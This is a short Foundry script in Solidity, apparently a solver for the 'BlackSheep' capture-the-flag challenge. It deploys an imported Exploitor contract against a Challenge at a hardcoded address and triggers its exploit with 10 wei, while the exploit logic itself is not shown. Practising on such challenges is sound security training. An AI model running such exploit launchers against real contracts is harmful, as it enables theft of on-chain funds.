// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import "./Challenge.sol";
import "./ISimpleBank.sol";
import "./Exploitor.sol";

contract BlackSheepSolver is Script {
    function setUp() public {}

    function run() public {
        Challenge challenge = Challenge(
            address(0x52026cF4ff14fdCE8ebb1542C4BA6D9a48666De9)
        );
        vm.startBroadcast();
        Exploitor exploitor = new Exploitor(challenge);
        exploitor.exploit{value: 10 wei}();
        vm.stopBroadcast();
    }
}
